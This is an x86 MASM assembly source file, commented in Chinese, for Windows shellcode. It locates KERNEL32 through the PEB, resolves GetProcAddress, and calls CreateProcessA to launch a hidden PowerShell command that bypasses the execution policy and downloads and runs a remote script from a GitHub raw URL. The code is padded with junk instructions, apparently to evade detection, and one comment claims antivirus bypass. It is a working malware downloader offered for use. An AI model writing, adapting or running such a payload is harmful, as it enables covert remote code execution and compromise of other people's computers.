.386
.model flat,stdcall
option casemap:none
include windows.inc


.code;�����
start:;�������ǿ�ʼ���ǵ�Shellcode����
push ebp
sub esp,100
mov ebp,esp;Ԥ��������ַ�ռ��������ǰѶ�̬���ַ�ͺ�����ַ������ebp����
;*********************************************************************************
assume fs:nothing
xor   ecx,ecx
push ebp
mov ebp,10h
add ebp,20h
mov eax,fs:[ebp]
pop ebp
mov edi,edi
mov edi,0ch
mov eax,[eax + edi]
mov edi,edi
add edi,10h
mov esi,[eax + 1ch]
mov esi,esi
next_module: 
        mov   eax,[esi+08h]
        nop
        mov   edi,[esi+20h]
        mov   esi,[esi]
        mov   esi,esi
        cmp  [edi+12*2],cx
        nop
        mov edi,edi
jnz  next_module;������ʵ������KERNEL32��ַ��
MOV [ebp+40],eax;�ѵõ���KERNEL32��ַ���浹[ebp+40] ,xp  win7 64λͨɱ
mov edx,eax 
;********************************************************************************* 
   
    mov eax,(IMAGE_DOS_HEADER ptr [edx]).e_lfanew    ;�õ�IMAGE_NT_HEADERS��ַ
    mov eax,(IMAGE_NT_HEADERS ptr [edx + eax]).OptionalHeader.DataDirectory.VirtualAddress    ;�õ�������RVA
    add eax,edx                    ;���������ڴ��ʵ�ʵ�ַ
    assume eax:ptr IMAGE_EXPORT_DIRECTORY
    mov esi,[eax].AddressOfNames
    add esi,edx
    push 00007373h    ;�ڶ�ջ�й���GetProcAddress
    push 12
    pop ecx
    push 65726464h
    mov ecx, 12h
    push 41636F72h
    add ecx,545h
    push 50746547h
    push esp
    xor ecx,ecx
    .repeat
    	mov edi,edi
        mov edi,[esi]
        add edi,edx
        push esi
        mov esi,[esp + 4]
        push ecx
        mov ecx,ecx
        mov ecx,0fh ;GetProcAddress�ĳ��ȣ�����0
        repz cmpsb
        .break .if ZERO? ;�ҵ�����ѭ��
        pop ecx
        nop
        pop esi
        mov esi,esi
        add esi,4
        inc ecx
    .until ecx >= [eax].NumberOfNames
    pop ecx
    mov esi,[eax].AddressOfNameOrdinals
    mov esi,esi
    add esi,edx
    movzx ecx,word ptr [esi + ecx*2] ;ȡ������
    mov edi,edx
    mov esi,[eax].AddressOfFunctions
    assume eax:nothing
    add esi,edx
    mov esi,esi
    mov esi,[esi + ecx*4]
    add esi,edx
    mov edx,edx 
    mov  edi,edx;�����õ�GetProcAddress��ַ
    mov edi,edi
    MOV [ebp+45],esi;�ѵõ���GetProcAddress������ַ���浹[ebp+45]
    mov esi,esi
;********************************************************************************* 

;********************************************************************************* 
;�Ҿͱ�д�������� ������������Ա�д����Ҫ�ĳ�����
;�������ǻ�����ͬ���ķ����õ�ExitProcess����
call _createprocess
    db 'CreateProcessA',0
_createprocess:         
       pop ebx
       push ebx
       push [ebp+40]
       call dword ptr [ebp+45]       
       push ebp
       mov ecx,ebp
       push ecx
       push 0
       push 0
       push 0
       push 0
       push 0
       push 0              
       call _powershell
      db "powershell -WindowStyle Hidden -ExecutionPolicy Bypass IEX (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Voraka/Stape/master/startpage.ps1');",0
_powershell:
       push 0
       mov edx,eax
       call edx
       nop
call _exitprocess
    db 'ExitProcess',0
_exitprocess:  
	push [ebp+40]
	call dword ptr [ebp+45]
	nop
	nop
	nop
	nop
	nop
	push 0
	mov edx,eax
	call edx 
;����ҾͲ�ע���� �������Լ��о���
;********************************************************************************* 
end start